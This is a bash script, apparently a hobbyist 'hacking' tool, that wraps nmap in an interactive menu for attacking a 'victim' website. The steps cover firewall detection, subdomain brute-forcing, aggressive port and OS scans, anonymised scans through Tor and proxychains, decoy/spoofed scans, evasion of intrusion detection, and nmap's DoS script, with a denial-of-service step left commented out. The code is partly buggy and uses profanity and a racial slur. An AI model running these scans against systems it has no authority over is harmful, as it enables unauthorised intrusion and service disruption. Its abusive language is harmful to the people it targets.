#!/bin/bash 
BOLD="\033[01;01m"     # makini sana
RED="\033[01;31m"      # error na warning
GREEN="\033[01;32m"    # fucked
YELLOW="\033[01;33m"   # kichwa
RESET="\033[00m"
echo ""

echo -e "\n  $YELLOW[*]$RED THIS TOOL WILL PERFORMING THE FOLLOWING TASKS ${RESET}\n"

echo    "[1]  WEB APPLICATION FIREWALL DETECTION"
echo    "[2]  FIND SHARED && NEW SERVERS"
echo -e "[3]  FIND HTTP ERRORS "
echo    "[4]  RUNNING SERVICES (PORTS)"
echo    "[5]  EXTRACT EXIF Data from photos(DETERMINE DEVICE USED BY A VICTIM eg phone etc)"
echo    "[6]  ANONYMOUSLY SCAN"
echo    "[7]  SPOOFING & DECOY SCAN"
echo    "[8]  EVADING FIREWALL****Block all firewall"
echo    "[9]  SCANNING WITH REASONS ***Advanced***"
echo    "[10] OPERATING SYSTEM DETECTION"
echo    "[11] TURN OFF EVADING INSTRUSION DETECTION SYSTEM****fuck off**"
echo    "[12] TEST IF A VICTIM IS VULNERABLE TO DOS"
echo    "[13] USE SCANNING METHOD TO PERFORM DOS(if is vurnerable)"
echo    "[14] IP RANGES SCANNING(subnet scanner) ***favorite***"
echo -e "[15] DNS WEB BRUET-FORCING $YELLOW cooming SOON"

echo -e ">>>>>>>>>>>>>>>>>>>$RED coded by mrAnonymousTZ $YELLOW>>>>>>>>>>>>>>>>>>"

echo -e "\n  [1] ${RED}   WEB APPLICATION FIREWALL DETECTION SCANNING.....WAIT ${RESET}\n"

echo -e "$GREEN Enter ur victim Website domain name(eg. example.com):  \c"


read DOMAIN

if [ "$DOMAIN" ]
then
	nmap -p80,443 --script http-waf-detect -script-args="http-waf-detect.arggro,http-waf-detect.detectBodyChange" $DOMAIN

fi

echo -e "\n $YELLOW [2] ${RED}   FINDING SHARED && NEW SERVERS ${RESET}\n"

echo -e "$GREEN finding shared && New server...cool (Enter victim website(eg example.com)  or press Enter TO SKIP): \c"


read WEBSITE

if [ "$WEBSITE" ]

then 
	nmap -p80,443 --script dns-brute $WEBSITE

echo -e "\n $YELLOW [3] ${RED}   FINDING HTTP ERRORS ${RESET}\n"

	nmap -p80,443 --script http-errors $WEBSITE

	
fi


echo -e "\n $YELLOW [4] ${RED}   FINDING RUNNING SERVICES (PORTS) ${RESET}\n"

echo -e "$GREEN Enter your Target Website ..that NUty right? or press Enter to SKIP: \c"

read TARGET_WEBSITE

if [ "$TARGET_WEBSITE" ]

then
	nmap -T4 -A -v $TARGET_WEBSITE

fi

echo -e "\n $YELLOW [5] ${RED}   EXTRACT EXIF DATA FROM PHOTOS ${RESET}\n"

echo -e "$GREEN Enter your Target Website .. or press Enter to SKIP: \c"

read TARGET

if [ "$TARGET" ]

then

	nmap -p80,443 --script http-exif-spider $TARGET

fi

echo -e "\n $YELLOW [6] ${RED}   ANONYMOUSLY SCAN  ${RESET}\n"





if [  -e /usr/bin/proxychains ]; then
    echo -e $GREEN "[ ✔ ] proxychains ................[ found ] GOOD JOB NIGGA LETS MOVE"
else 
	echo -e $RED "[ X ] proxychains -> not found is dangerous to perform this with out hide you identity"
	echo -e "\n [*] ${YELLOW} okay lets install it  ${RESET}\n"
	echo -e "\n [*] ${GREEN} okay wait........................${RESET}\n"
	echo -e "\n [*] ${GREEN} GOt IT........INSTALLING proxychains ${RESET}\n"
	sudo apt-get install proxychains

fi

if [  -e /etc/tor ]; then
    echo -e $GREEN "[ ✔ ] tor ................[ found ] GOOD JOB NIGGA LETS MOVE"
else 
	echo -e $RED "[ X ] tor -> not found is dangerous to perform this with out hide you tor"
	echo -e "\n [*] ${YELLOW} okay lets install it  ${RESET}\n"
	echo -e "\n [*] ${GREEN} okay wait........................${RESET}\n"
	echo -e "\n [*] ${GREEN} GOt IT........INSTALLING tor ${RESET}\n"
	sudo apt-get install tor

fi

echo -e "\n $YELLOW [*] ${RED}   STARTING ANONYMOUSLY SCAN......  ${RESET}\n"

echo -e "$GREEN Enter your Target Website .. or press Enter to SKIP: \c"

read TARGET_SITE

if [ "$TARGET_SITE" ]

then

	sudo proxychains nmap -sT -PN -n -sV -p 80,443,21,22, $TARGET_SITE

echo -e "$GREEN make sure to change tor config of tor"
echo -e "$GREEN /etc/proxychains.conf"
echo -e"$GREEN it should be look like this"
echo -e"$GREEN #add proxy here..."
echo -e"$GREEN #meanwile"
echo -e"$GREEN default set to "tor""
echo -e"$GREEN socks4 127.0.0.1 9050"
echo -e"$GREEN socks4 xxx.xx.x  xxxx"
echo "socks4 xxx.xx.x  xxxx make sure to put proxy address and port, simply u can use http.//spys.one"

fi


echo -e "\n $YELLOW [7] ${RED}   SPOOFING & DECOY SCAN ${RESET}\n"

echo -e "$GREEN Enter your Target Website and spoofer ip address (eg. example.com 10.9.9.0.10,195.90.78.90,19.89.78.1): \c"

read WEB

if [ "$WEB $SPOOFER1,$SPOOFER2,$SPOOFER3" ]
then

	nmap -sS $WEB -D $SPOOFER1,$SPOOFER2,$SPOOFER3
fi 


echo -e "\n $YELLOW [8] ${RED}   EVADING FIREWALL****Block all firewall ${RESET}\n"


echo -e "$GREEN Enter your Target Website/IP here  .. or press Enter to SKIP: \c"

read HOST

if [ "$HOST" ]

then 
	nmap -sS -P0 $HOST

fi



echo -e "\n $YELLOW [9] ${RED}   SCANNING WITH REASONS (Advanced) ${RESET}\n"

echo -e "$GREEN Enter your Target Website/IP here  .. or press Enter to SKIP: \c"

read VICTIM_WEB

if [ "$VICTIM_WEB" ]

then 
	nmap -sU --reason $VICTIM_WEB

fi




echo -e "\n $YELLOW [10] ${RED}   OPERATING SYSTEM DETECTION ${RESET}\n"

echo -e "$GREEN Enter your Target website/IP Address: \c" 

read HOST_IP

if [ "$HOST_IP" ]

then
	nmap -O $HOST_IP

fi

echo -e "\n $YELLOW [11] ${RED}   TURN OFF EVADING INSTRUSION DETECTION SYSTEM ${RESET}\n"

echo "Most commercial servers and websites have intrusion detection systems (IDS) protecting them.
These systems look for telltale signs of malicious activity, then alert the security administrator. 
Scans such as ours are easily detected by these systems and can set off an alert."


echo "LETS FUCK IT NOW.........@MR_AnoNymous"

echo -e "$GREEN Enter your Target website/IP Address: \c"

read FUCKED_IP

if [ "$FUCKED_IP" ]

then
	nmap -sS -T2 $FUCKED_IP


fi

echo -e "\n $YELLOW [12] ${RED}   TEST IF A VICTIM IS VULNERABLE TO DOS ${RESET}\n"

echo -e "$GREEN Enter your Target website/IP Address: \c"

read FUCKED_DOS

if [ "$FUCKED_DOS" ]
then
	nmap --script dos -Pn $FUCKED_HOST

fi

#echo -e "\n $YELLOW [13] ${RED} USE SCANNING METHOD TO PERFORM DOS(if is vurnerable) ${RESET}\n"

#echo -e "$GREEN Enter your Target website/IP Address: \c"

#read DOS_HARD

#if [ "$DOS_HARD" ]

echo -e "\n $YELLOW [14] ${RED}   IP RANGES SCANNING(subnet scanner) ${RESET}\n"

echo "Dont forget to edit this scrip in this part, in (seq 1 255) put your own range)"

echo -e "$GREEN Enter your Target subnet only three digits (eg. 192.34.89): \c"

read SUBNET

for IP in $(seq 1 255); do
	ping -c 1 $SUBNET.$IP
done

exit 0

	




	



















	








	




 












